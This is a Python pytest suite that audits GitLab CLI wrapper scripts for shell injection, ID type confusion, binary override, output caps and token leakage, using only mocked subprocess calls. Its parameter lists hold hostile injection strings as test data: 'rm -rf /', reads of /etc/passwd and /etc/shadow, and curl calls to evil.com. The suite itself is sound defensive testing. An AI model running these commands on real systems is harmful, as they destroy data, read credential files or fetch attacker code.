"""Security audit for glab ops: gl-issue, gl-mr, gl-pipeline, gl-job.

Adversarial test suite covering:
- Shell injection via list-form subprocess (never shell=True)
- Issue/MR/pipeline/job number injection
- Branch name injection
- Non-numeric / type confusion for numeric IDs
- GLAB_BIN env override
- Modifier injection (raw, full, status, errors)
- Response JSON injection (shell-special chars in fields)
- Output size cap for gl-job raw mode
- Token leakage from glab auth errors
- MR diff size cap

Each test mocks subprocess.run — no real glab calls, no network.
"""
from __future__ import annotations

import importlib.util
import json
import subprocess
import sys
from io import StringIO
from pathlib import Path
from typing import Any

import pytest

# ---------------------------------------------------------------------------
# Load modules under test
# ---------------------------------------------------------------------------

def _load(name: str, rel: str):
    path = Path(__file__).parent.parent / rel
    spec = importlib.util.spec_from_file_location(name, path)
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod

issue = _load("gitlab_issue", "presets/gitlab/issue.py")
mr    = _load("gitlab_mr",    "presets/gitlab/mr.py")
job   = _load("gitlab_job",   "presets/gitlab/job.py")
pipe  = _load("gitlab_pipeline", "presets/gitlab/pipeline.py")

# Sentinel token value — never a real credential. `glpat-`, with a hyphen: this
# fixture used to spell it `glpat_`, which is the same wrong spelling the four
# classifiers under test carried, so the pair agreed with each other and with no
# GitLab that ever existed (#1645). The prefix list and its source are pinned in
# tests/test_glab_token_prefix_1645.py; this stays a literal because these tests
# are about output, not about the prefix table.
FAKE_TOKEN = "glpat-fake-token-xyz-0123456789"

# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------

def _ok(stdout: str = "{}", stderr: str = "", returncode: int = 0) -> subprocess.CompletedProcess:
    return subprocess.CompletedProcess(args=[], returncode=returncode, stdout=stdout, stderr=stderr)


def _err(stderr: str = "error", returncode: int = 1) -> subprocess.CompletedProcess:
    return subprocess.CompletedProcess(args=[], returncode=returncode, stdout="", stderr=stderr)


class CallRecorder:
    """Wraps a fake subprocess.run and records every argv list."""

    def __init__(self, response_fn=None):
        self.calls: list[list[str]] = []
        self._fn = response_fn or (lambda args, **kw: _ok())

    def __call__(self, args, **kw) -> subprocess.CompletedProcess:
        self.calls.append(list(args))
        return self._fn(args, **kw)

    @property
    def first(self) -> list[str]:
        return self.calls[0]

    def all_args_flat(self) -> list[str]:
        return [a for call in self.calls for a in call]


# ===========================================================================
# 1. Shell injection — subprocess list form, never shell=True
# ===========================================================================

class TestShellInjection:
    """Every glab subprocess call must use list form, never shell=True."""

    def test_issue_view_no_shell_true(self, monkeypatch) -> None:
        rec = CallRecorder(lambda args, **kw: _ok(json.dumps({"iid": 1, "title": "t", "state": "opened", "labels": [], "assignees": [], "author": {}})))
        monkeypatch.setattr(issue.subprocess, "run", rec)
        monkeypatch.setattr(sys, "argv", ["issue.py", "42"])
        issue.main()
        for call in rec.calls:
            assert isinstance(call, list), "subprocess args must be a list (not a string)"
        # shell=True is never passed — monkeypatch captures **kw; verify via introspection
        # We can't directly inspect shell= from inside the lambda but we can assert
        # the first element is always "glab" (not a shell string like "glab issue view 42")
        assert rec.first[0] == "glab"

    def test_mr_view_no_shell_true(self, monkeypatch) -> None:
        mr_json = json.dumps({
            "iid": 10, "title": "Fix", "state": "opened", "source_branch": "feat",
            "target_branch": "master", "author": {"username": "u"}, "labels": [],
            "assignees": [], "reviewers": [], "has_conflicts": False,
            "merge_status": "can_be_merged",
        })
        rec = CallRecorder(lambda args, **kw: _ok(mr_json))
        monkeypatch.setattr(mr.subprocess, "run", rec)
        monkeypatch.setattr(sys, "argv", ["mr.py", "10"])
        mr.main()
        for call in rec.calls:
            assert isinstance(call, list)
        assert rec.first[0] == "glab"

    def test_pipeline_no_shell_true(self, monkeypatch) -> None:
        jobs_json = json.dumps([
            {"name": "test", "stage": "test", "status": "success", "duration": 5.0,
             "pipeline": {"status": "success"}}
        ])
        rec = CallRecorder(lambda args, **kw: _ok(jobs_json))
        monkeypatch.setattr(pipe.subprocess, "run", rec)
        monkeypatch.setattr(sys, "argv", ["pipeline.py", "999"])
        pipe.main()
        for call in rec.calls:
            assert isinstance(call, list)
        assert rec.first[0] == "glab"

    def test_job_no_shell_true(self, monkeypatch) -> None:
        meta = json.dumps({
            "name": "phpstan", "status": "failed", "stage": "quality",
            "duration": 30.0, "web_url": "https://gl/job/1", "ref": "main",
            "pipeline": {"id": 1},
        })
        rec = CallRecorder(lambda args, **kw: _ok(meta if "trace" not in args[-1] else "log line\n"))
        monkeypatch.setattr(job.subprocess, "run", rec)
        monkeypatch.setattr(sys, "argv", ["job.py", "1"])
        job.main()
        for call in rec.calls:
            assert isinstance(call, list)
        assert rec.first[0] == "glab"

    def test_no_f_string_concat_reaches_shell(self, monkeypatch) -> None:
        """Payload with shell metacharacters must arrive literally in argv, not expanded."""
        payload = "42; rm -rf /"
        captured: list[list[str]] = []

        def spy(args, **kw):
            captured.append(list(args))
            return _err("not found", 1)

        monkeypatch.setattr(issue.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["issue.py", payload])
        issue.main()
        # The payload must appear as a single argv element, not be shell-expanded
        flat = [a for call in captured for a in call]
        # "rm" must NOT appear as a separate token — that would mean shell expansion happened
        assert "rm" not in flat, "shell metacharacter was expanded — shell=True or string concat detected"
        # The full payload string must appear literally somewhere in the args
        assert any(payload == a or payload in a for a in flat), \
            "payload was dropped entirely — subprocess args look wrong"


# ===========================================================================
# 2. Issue/MR/pipeline/job number injection
# ===========================================================================

class TestIDInjection:
    """Injected chars in the numeric ID must be passed literally, not shell-expanded."""

    @pytest.mark.parametrize("payload", [
        "'); rm -rf /",
        "1 && cat /etc/passwd",
        "1\nrm -rf /",
        "$(evil)",
        "`evil`",
    ])
    def test_issue_id_injection(self, monkeypatch, payload: str) -> None:
        captured: list[list[str]] = []

        def spy(args, **kw):
            captured.append(list(args))
            return _err("not found", 1)

        monkeypatch.setattr(issue.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["issue.py", payload])
        issue.main()
        flat = [a for call in captured for a in call]
        assert "rm" not in flat
        assert "cat" not in flat
        assert "evil" not in flat or any(payload in a for a in flat)

    @pytest.mark.parametrize("payload", [
        "10; rm -rf /",
        "10 || evil",
        "10`whoami`",
    ])
    def test_mr_id_injection(self, monkeypatch, payload: str) -> None:
        captured: list[list[str]] = []

        def spy(args, **kw):
            captured.append(list(args))
            return _err("not found", 1)

        monkeypatch.setattr(mr.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["mr.py", payload])
        mr.main()
        flat = [a for call in captured for a in call]
        assert "rm" not in flat
        assert "evil" not in flat or any(payload in a for a in flat)

    @pytest.mark.parametrize("payload", [
        "999; rm -rf /",
        "999 && id",
        "$(cat /etc/shadow)",
    ])
    def test_pipeline_id_injection(self, monkeypatch, payload: str) -> None:
        captured: list[list[str]] = []

        def spy(args, **kw):
            captured.append(list(args))
            return _err("not found", 1)

        monkeypatch.setattr(pipe.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["pipeline.py", payload])
        pipe.main()
        flat = [a for call in captured for a in call]
        assert "rm" not in flat
        assert "id" not in [a.strip() for a in flat] or any(payload in a for a in flat)

    @pytest.mark.parametrize("payload", [
        "1; rm -rf /",
        "1 | cat /etc/passwd",
        "`curl evil.com`",
    ])
    def test_job_id_injection(self, monkeypatch, payload: str) -> None:
        captured: list[list[str]] = []

        def spy(args, **kw):
            captured.append(list(args))
            return _err("not found", 1)

        monkeypatch.setattr(job.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["job.py", payload])
        job.main()
        flat = [a for call in captured for a in call]
        assert "rm" not in flat
        assert "curl" not in flat


# ===========================================================================
# 3. Branch name injection in gl-mr:BRANCH_NAME
# ===========================================================================

class TestBranchInjection:
    """Branch names with shell metacharacters must be treated as literal API params."""

    @pytest.mark.parametrize("branch", [
        "feature/branch;rm -rf /",
        "feature/$(whoami)",
        "feat\x00hidden",
        "feat`id`",
        "feat && evil",
    ])
    def test_branch_name_injection(self, monkeypatch, branch: str) -> None:
        """Branch name is passed to glab api as a URL query param, not eval'd."""
        captured: list[list[str]] = []

        def spy(args, **kw):
            captured.append(list(args))
            # Simulate no MR found for the branch
            if "merge_requests" in (args[2] if len(args) > 2 else ""):
                return _ok("[]")
            return _err("not found", 1)

        monkeypatch.setattr(mr.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["mr.py", branch])
        mr.main()

        flat = [a for call in captured for a in call]
        assert "rm" not in flat
        assert "whoami" not in flat
        assert "evil" not in flat
        # The branch should appear in the URL passed to glab api (as a query param string)
        # At minimum, no separate 'rm' or shell token should appear
        assert all(a != "rm" for a in flat)

    def test_branch_name_in_api_url_is_literal(self, monkeypatch) -> None:
        """The branch value is embedded in a URL string passed as a single argv element."""
        branch = "feature/test;evil"
        api_urls_seen: list[str] = []

        def spy(args, **kw):
            if len(args) > 2:
                api_urls_seen.append(args[2])
            return _ok("[]")

        monkeypatch.setattr(mr.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["mr.py", branch])
        mr.main()

        # The branch is embedded in the URL as a single string element of argv
        # It must NOT be split into separate tokens by any shell
        for url in api_urls_seen:
            if "source_branch" in url:
                # The semicolon and "evil" must be inside the URL string, not as separate tokens
                assert branch in url or "source_branch=" in url
                break


# ===========================================================================
# 4. Pipeline/job number type confusion
# ===========================================================================

class TestNumericTypeConfusion:
    """Non-numeric, negative, hex, and scientific notation IDs must error cleanly."""

    @pytest.mark.parametrize("bad_id", [
        "abc",
        "-1",
        "0x1F",
        "1e5",
        "1.5",
        "",
        " ",
        "null",
        "undefined",
        "true",
        "[]",
        "{}",
    ])
    def test_pipeline_non_numeric_id(self, monkeypatch, bad_id: str, capsys) -> None:
        """Pipeline op passes the value to glab; if glab rejects, error is clean."""
        def spy(args, **kw):
            # Simulate glab returning a 404 for non-numeric IDs
            return _err("404 not found", 1)

        monkeypatch.setattr(pipe.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["pipeline.py", bad_id])
        rc = pipe.main()
        out = capsys.readouterr()
        # Must not crash with unhandled exception
        assert rc != 0 or "ERROR" in out.out
        # No Python traceback
        assert "Traceback" not in out.out
        assert "Traceback" not in out.err

    @pytest.mark.parametrize("bad_id", [
        "abc",
        "-1",
        "0xFF",
        "1e10",
        "",
        "NaN",
        "Infinity",
    ])
    def test_job_non_numeric_id(self, monkeypatch, bad_id: str, capsys) -> None:
        def spy(args, **kw):
            return _err("404 not found", 1)

        monkeypatch.setattr(job.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["job.py", bad_id])
        rc = job.main()
        out = capsys.readouterr()
        assert rc != 0 or "ERROR" in out.out
        assert "Traceback" not in out.out
        assert "Traceback" not in out.err

    def test_job_raw_mode_non_integer_start(self, monkeypatch, capsys) -> None:
        """Non-integer START for raw mode must produce ERROR, not crash."""
        meta = json.dumps({
            "name": "j", "status": "failed", "stage": "s", "duration": 1.0,
            "web_url": "", "ref": "main", "pipeline": {"id": 1},
        })
        def spy(args, **kw):
            return _ok(meta if "trace" not in args[-1] else "line1\n")
        monkeypatch.setattr(job.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["job.py", "1", "raw", "abc"])
        rc = job.main()
        out = capsys.readouterr()
        assert rc != 0
        assert "ERROR" in out.out

    def test_job_raw_mode_non_integer_end(self, monkeypatch, capsys) -> None:
        meta = json.dumps({
            "name": "j", "status": "failed", "stage": "s", "duration": 1.0,
            "web_url": "", "ref": "main", "pipeline": {"id": 1},
        })
        def spy(args, **kw):
            return _ok(meta if "trace" not in args[-1] else "line1\n")
        monkeypatch.setattr(job.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["job.py", "1", "raw", "1", "xyz"])
        rc = job.main()
        out = capsys.readouterr()
        assert rc != 0
        assert "ERROR" in out.out


# ===========================================================================
# 5. GLAB_BIN env override
# ===========================================================================

class TestGlabBinEnvOverride:
    """glab binary is hardcoded as "glab" — not overridable via env."""

    def test_glab_bin_env_does_not_change_binary_in_issue(self, monkeypatch) -> None:
        captured: list[str] = []

        def spy(args, **kw):
            captured.append(args[0])
            return _err("not found", 1)

        monkeypatch.setenv("GLAB_BIN", "/tmp/evil_binary")
        monkeypatch.setattr(issue.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["issue.py", "1"])
        issue.main()
        # Binary must always be "glab", never "/tmp/evil_binary"
        assert all(b == "glab" for b in captured), \
            f"GLAB_BIN was respected — binary changed to: {set(captured) - {'glab'}}"

    def test_glab_bin_env_does_not_change_binary_in_mr(self, monkeypatch) -> None:
        captured: list[str] = []

        def spy(args, **kw):
            captured.append(args[0])
            return _err("not found", 1)

        monkeypatch.setenv("GLAB_BIN", "/tmp/evil_binary")
        monkeypatch.setattr(mr.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["mr.py", "1"])
        mr.main()
        assert all(b == "glab" for b in captured), \
            f"GLAB_BIN was respected — binary changed to: {set(captured) - {'glab'}}"

    def test_glab_bin_env_does_not_change_binary_in_pipeline(self, monkeypatch) -> None:
        captured: list[str] = []

        def spy(args, **kw):
            captured.append(args[0])
            return _err("not found", 1)

        monkeypatch.setenv("GLAB_BIN", "/tmp/evil_binary")
        monkeypatch.setattr(pipe.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["pipeline.py", "1"])
        pipe.main()
        assert all(b == "glab" for b in captured)

    def test_glab_bin_env_does_not_change_binary_in_job(self, monkeypatch) -> None:
        captured: list[str] = []

        def spy(args, **kw):
            captured.append(args[0])
            return _err("not found", 1)

        monkeypatch.setenv("GLAB_BIN", "/tmp/evil_binary")
        monkeypatch.setattr(job.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["job.py", "1"])
        job.main()
        assert all(b == "glab" for b in captured)


# ===========================================================================
# 6. Modifier injection (:full, :status, :raw, :errors)
# ===========================================================================

class TestModifierInjection:
    """Modifiers are positional argv[2]; injection attempts must not execute."""

    @pytest.mark.parametrize("modifier", [
        "; rm -rf /",
        "raw; rm -rf /",
        "$(evil)",
        "full && cat /etc/shadow",
        "status`id`",
    ])
    def test_job_modifier_injection(self, monkeypatch, modifier: str) -> None:
        """Unknown modifier → treated as unknown mode (not raw/errors), no shell exec."""
        meta = json.dumps({
            "name": "j", "status": "success", "stage": "s", "duration": 1.0,
            "web_url": "", "ref": "main", "pipeline": {"id": 1},
        })
        captured: list[list[str]] = []

        def spy(args, **kw):
            captured.append(list(args))
            return _ok(meta if "trace" not in args[-1] else "log line\n")

        monkeypatch.setattr(job.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["job.py", "1", modifier])
        rc = job.main()
        flat = [a for call in captured for a in call]
        assert "rm" not in flat
        assert "evil" not in flat
        # Must not crash
        assert rc in (0, 1)

    @pytest.mark.parametrize("modifier", [
        "; rm -rf /",
        "full; evil",
        "$(id)",
    ])
    def test_issue_modifier_injection(self, monkeypatch, modifier: str) -> None:
        captured: list[list[str]] = []

        def spy(args, **kw):
            captured.append(list(args))
            return _err("not found", 1)

        monkeypatch.setattr(issue.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["issue.py", "1", modifier])
        rc = issue.main()
        flat = [a for call in captured for a in call]
        assert "rm" not in flat
        assert "evil" not in flat

    @pytest.mark.parametrize("modifier", [
        "; rm -rf /",
        "status && evil",
    ])
    def test_mr_modifier_injection(self, monkeypatch, modifier: str) -> None:
        captured: list[list[str]] = []

        def spy(args, **kw):
            captured.append(list(args))
            return _err("not found", 1)

        monkeypatch.setattr(mr.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["mr.py", "1", modifier])
        rc = mr.main()
        flat = [a for call in captured for a in call]
        assert "rm" not in flat
        assert "evil" not in flat

    def test_job_raw_modifier_known_safe(self, monkeypatch, capsys) -> None:
        """Legitimate 'raw' modifier must work normally."""
        meta = json.dumps({
            "name": "j", "status": "success", "stage": "s", "duration": 1.0,
            "web_url": "", "ref": "main", "pipeline": {"id": 1},
        })
        def spy(args, **kw):
            return _ok(meta if "trace" not in args[-1] else "line1\nline2\n")
        monkeypatch.setattr(job.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["job.py", "1", "raw"])
        rc = job.main()
        out = capsys.readouterr().out
        assert rc == 0
        assert "Raw" in out

    def test_issue_full_modifier_known_safe(self, monkeypatch, capsys) -> None:
        """Legitimate 'full' modifier must work normally."""
        issue_json = json.dumps({
            "iid": 1, "title": "Test", "state": "opened", "labels": [],
            "assignees": [], "author": {"username": "u"},
        })
        def spy(args, **kw):
            return _ok(issue_json)
        monkeypatch.setattr(issue.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["issue.py", "1", "full"])
        rc = issue.main()
        assert rc == 0


# ===========================================================================
# 7. Response JSON injection — shell-special chars in response fields
# ===========================================================================

class TestResponseJSONInjection:
    """Shell-special chars returned by the API must be printed, not executed."""

    def test_issue_title_with_shell_chars_printed_not_executed(self, monkeypatch, capsys) -> None:
        evil_title = "Title; rm -rf / && echo PWNED"
        issue_json = json.dumps({
            "iid": 1, "title": evil_title, "state": "opened",
            "labels": [], "assignees": [], "author": {"username": "u"},
            "web_url": "https://gitlab.example/issues/1",
        })
        def spy(args, **kw):
            return _ok(issue_json)
        monkeypatch.setattr(issue.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["issue.py", "1"])
        rc = issue.main()
        out = capsys.readouterr().out
        assert rc == 0
        # The title is printed verbatim — no shell expansion
        assert evil_title in out
        # The shell command is NOT executed (we can't really test exec, but
        # verify the chars appear literally in output, not as a side effect)
        assert "PWNED" in out  # it's in the title string, printed as text

    def test_mr_source_branch_with_shell_chars(self, monkeypatch, capsys) -> None:
        evil_branch = "feat/$(curl evil.com -o /tmp/x)"
        mr_json = json.dumps({
            "iid": 10, "title": "Fix", "state": "opened",
            "source_branch": evil_branch, "target_branch": "master",
            "author": {"username": "u"}, "labels": [], "assignees": [],
            "reviewers": [], "has_conflicts": False, "merge_status": "can_be_merged",
        })
        captured: list[list[str]] = []

        def spy(args, **kw):
            captured.append(list(args))
            return _ok(mr_json)

        monkeypatch.setattr(mr.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["mr.py", "10"])
        rc = mr.main()
        out = capsys.readouterr().out
        # The branch appears in output literally
        assert evil_branch in out or "feat/" in out
        # Must NOT appear as a separate argv token in any subsequent subprocess call
        flat = [a for call in captured for a in call]
        assert "curl" not in flat or any(evil_branch in a for a in flat)

    def test_mr_web_url_with_shell_chars_not_in_subprocess(self, monkeypatch, capsys) -> None:
        """web_url from API response is printed but never passed to a new subprocess."""
        evil_url = "https://gitlab.example/mr/1; rm -rf /"
        mr_json = json.dumps({
            "iid": 10, "title": "Fix", "state": "opened",
            "source_branch": "feat", "target_branch": "master",
            "author": {"username": "u"}, "labels": [], "assignees": [],
            "reviewers": [], "has_conflicts": False, "merge_status": "can_be_merged",
            "web_url": evil_url,
        })
        captured: list[list[str]] = []

        def spy(args, **kw):
            captured.append(list(args))
            return _ok(mr_json)

        monkeypatch.setattr(mr.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["mr.py", "10"])
        mr.main()
        flat = [a for call in captured for a in call]
        # The evil_url must NEVER be an argument passed to any subprocess
        assert evil_url not in flat

    def test_job_ref_with_shell_chars_not_executed(self, monkeypatch, capsys) -> None:
        evil_ref = "main; curl http://evil.com"
        meta = json.dumps({
            "name": "phpstan", "status": "success", "stage": "quality",
            "duration": 5.0, "web_url": "", "ref": evil_ref,
            "pipeline": {"id": 1},
        })
        captured: list[list[str]] = []

        def spy(args, **kw):
            captured.append(list(args))
            return _ok(meta if "trace" not in args[-1] else "log\n")

        monkeypatch.setattr(job.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["job.py", "1"])
        job.main()
        flat = [a for call in captured for a in call]
        # ref value must not be passed to a new subprocess as a separate token
        # (it's only used in print() for the "Branch:" line)
        assert "curl" not in flat


# ===========================================================================
# 8. Output size cap — gl-job raw mode with huge log
# ===========================================================================

class TestOutputSizeCap:
    """gl-job raw mode with an enormous log: test cap behavior."""

    def test_job_raw_mode_huge_log_no_crash(self, monkeypatch, capsys) -> None:
        """10MB log in raw mode: op must not OOM or hang — it echoes lines."""
        # 100k lines × ~100 chars = ~10MB
        big_log = "\n".join(f"line {i}: " + "x" * 80 for i in range(100_000))
        meta = json.dumps({
            "name": "big-job", "status": "success", "stage": "build",
            "duration": 120.0, "web_url": "", "ref": "main", "pipeline": {"id": 1},
        })

        def spy(args, **kw):
            return _ok(meta if "trace" not in args[-1] else big_log)

        monkeypatch.setattr(job.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["job.py", "1", "raw"])
        rc = job.main()
        out = capsys.readouterr().out
        assert rc == 0
        # Fixed 2026-05-23: GL_JOB_RAW_MAX_LINES (default 5000) now caps full
        # unsliced raw dumps. The CAPPED marker confirms the guard fired.
        assert "CAPPED" in out
        assert "of 100000" in out
        # Lines beyond the cap must not appear in stdout
        assert "line 9999" not in out
        # First line must appear
        assert "line 0" in out

    def test_job_raw_mode_slice_limits_output(self, monkeypatch, capsys) -> None:
        """START:END slice effectively caps output to a range."""
        big_log = "\n".join(f"line {i}" for i in range(1, 10_001))
        meta = json.dumps({
            "name": "j", "status": "success", "stage": "s",
            "duration": 5.0, "web_url": "", "ref": "main", "pipeline": {"id": 1},
        })

        def spy(args, **kw):
            return _ok(meta if "trace" not in args[-1] else big_log)

        monkeypatch.setattr(job.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["job.py", "1", "raw", "1", "50"])
        rc = job.main()
        out = capsys.readouterr().out
        assert rc == 0
        assert "Raw lines 1-50" in out
        # Lines 51+ must NOT appear
        assert "line 51" not in out
        assert "line 100" not in out

    def test_job_smart_mode_tail_cap_applied(self, monkeypatch, capsys) -> None:
        """Smart mode (no raw) tails SUPERTOOL_LINES lines — default 80."""
        big_log = "\n".join(f"line {i}" for i in range(1, 201))
        meta = json.dumps({
            "name": "j", "status": "success", "stage": "s",
            "duration": 5.0, "web_url": "", "ref": "main", "pipeline": {"id": 1},
        })

        def spy(args, **kw):
            return _ok(meta if "trace" not in args[-1] else big_log)

        monkeypatch.setattr(job.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["job.py", "1"])
        rc = job.main()
        out = capsys.readouterr().out
        assert rc == 0
        # Default tail is 80 — line 1 (121 lines before tail window) must be absent
        assert "  121 | line 121" in out or "| line 121" in out  # it's in tail window
        assert "  1 | line 1" not in out  # line 1 is outside the tail window
        assert "120 lines skipped" in out or "lines skipped" in out


# ===========================================================================
# 9. Token leakage — glab auth error must not expose token value
# ===========================================================================

class TestTokenLeakage:
    """Simulate glab returning a token-laden error; assert no token in output."""

    def _token_error_response(self) -> subprocess.CompletedProcess:
        """Fake glab stderr that contains a token."""
        return subprocess.CompletedProcess(
            args=[],
            returncode=1,
            stdout="",
            stderr=f"WARN: authentication failed: token {FAKE_TOKEN} is invalid or expired",
        )

    def test_issue_does_not_echo_token_from_error(self, monkeypatch, capsys) -> None:
        monkeypatch.setattr(issue.subprocess, "run", lambda *a, **kw: self._token_error_response())
        monkeypatch.setattr(sys, "argv", ["issue.py", "1"])
        issue.main()
        out = capsys.readouterr()
        combined = out.out + out.err
        assert FAKE_TOKEN not in combined, \
            f"Token leaked into output: found {FAKE_TOKEN!r} in stdout/stderr"

    def test_mr_does_not_echo_token_from_error(self, monkeypatch, capsys) -> None:
        monkeypatch.setattr(mr.subprocess, "run", lambda *a, **kw: self._token_error_response())
        monkeypatch.setattr(sys, "argv", ["mr.py", "1"])
        mr.main()
        out = capsys.readouterr()
        combined = out.out + out.err
        assert FAKE_TOKEN not in combined

    def test_pipeline_does_not_echo_token_from_error(self, monkeypatch, capsys) -> None:
        monkeypatch.setattr(pipe.subprocess, "run", lambda *a, **kw: self._token_error_response())
        monkeypatch.setattr(sys, "argv", ["pipeline.py", "1"])
        pipe.main()
        out = capsys.readouterr()
        combined = out.out + out.err
        assert FAKE_TOKEN not in combined

    def test_job_does_not_echo_token_from_error(self, monkeypatch, capsys) -> None:
        monkeypatch.setattr(job.subprocess, "run", lambda *a, **kw: self._token_error_response())
        monkeypatch.setattr(sys, "argv", ["job.py", "1"])
        job.main()
        out = capsys.readouterr()
        combined = out.out + out.err
        assert FAKE_TOKEN not in combined

    def test_format_error_strips_token_keyword_to_generic_message(self) -> None:
        """_format_error with 'token' in stderr returns generic auth message."""
        # All four modules have the same _format_error logic
        for mod in (issue, mr, job, pipe):
            result = mod._format_error(
                f"token {FAKE_TOKEN} invalid", "resource", "1"
            )
            assert FAKE_TOKEN not in result, \
                f"{mod.__name__}._format_error leaked token in: {result!r}"
            assert "glab not authenticated" in result or "auth" in result.lower()


# ===========================================================================
# 10. MR diff size — large diff must not explode output
# ===========================================================================

class TestMRDiffSize:
    """gl-mr with a huge diff: verify cap behavior (changes_count only, no line counts)."""

    def test_mr_large_diff_stats_printed_not_truncated(self, monkeypatch, capsys) -> None:
        """changes_count=10000 — must be printed, not crash or be silently dropped."""
        mr_json = json.dumps({
            "iid": 10, "title": "Massive refactor", "state": "opened",
            "source_branch": "feat", "target_branch": "master",
            "author": {"username": "u"}, "labels": [], "assignees": [],
            "reviewers": [], "has_conflicts": False, "merge_status": "can_be_merged",
            "changes_count": "10000",  # GitLab returns this as string for large MRs
            # No diff_stats — glab omits them on large MRs
        })

        def spy(args, **kw):
            return _ok(mr_json)

        monkeypatch.setattr(mr.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["mr.py", "10"])
        rc = mr.main()
        out = capsys.readouterr().out
        assert rc == 0
        # Must mention the file count somehow
        assert "10000" in out
        # The "line counts unavailable" message is expected for large MRs
        assert "unavailable" in out or "10000" in out

    def test_mr_description_is_capped(self, monkeypatch, capsys) -> None:
        """Description exceeding DESCRIPTION_MAX must be truncated, not dump everything."""
        huge_desc = "A" * 10_000
        mr_json = json.dumps({
            "iid": 10, "title": "Fix", "state": "opened",
            "source_branch": "feat", "target_branch": "master",
            "author": {"username": "u"}, "labels": [], "assignees": [],
            "reviewers": [], "has_conflicts": False, "merge_status": "can_be_merged",
            "description": huge_desc,
        })

        def spy(args, **kw):
            # git rev-parse (used by _local_branch_check) must return a plain branch name
            if args[0] == "git":
                return _ok("feat")
            return _ok(mr_json)

        monkeypatch.setattr(mr.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["mr.py", "10"])
        mr.main()
        out = capsys.readouterr().out
        # The cap constant is DESCRIPTION_MAX = 2000
        desc_start = out.find("## Description")
        assert desc_start != -1, "## Description section missing from output"
        desc_section = out[desc_start:]
        assert len(desc_section) < 3000, \
            f"Description section is too large ({len(desc_section)} chars) — cap not applied"
        # The full 10k-char description must NOT appear
        assert huge_desc not in out, \
            "Full 10k description found in output — DESCRIPTION_MAX cap not applied"

    def test_mr_comments_are_capped(self, monkeypatch, capsys) -> None:
        """Each comment body is capped at COMMENT_MAX = 500."""
        # We test via the notes API response
        huge_body = "B" * 5000
        notes_json = json.dumps([
            {"system": False, "author": {"username": "alice"},
             "body": huge_body, "created_at": "2024-01-01T00:00:00Z"}
        ])
        mr_json = json.dumps({
            "iid": 10, "title": "Fix", "state": "opened",
            "source_branch": "feat", "target_branch": "master",
            "author": {"username": "u"}, "labels": [], "assignees": [],
            "reviewers": [], "has_conflicts": False, "merge_status": "can_be_merged",
        })

        def spy(args, **kw):
            endpoint = args[2] if len(args) > 2 else ""
            if "notes" in endpoint:
                return _ok(notes_json)
            return _ok(mr_json)

        monkeypatch.setattr(mr.subprocess, "run", spy)
        monkeypatch.setattr(sys, "argv", ["mr.py", "10"])
        mr.main()
        out = capsys.readouterr().out
        # The 5000-char body must be truncated — COMMENT_MAX = 500
        assert len(out) < len(huge_body) * 2, \
            "Comment body was not capped — full 5k chars emitted"
        # Only the first 500 chars of the body should appear
        assert out.count("B") <= 600, \
            f"Too many 'B' chars in output — comment likely not capped"
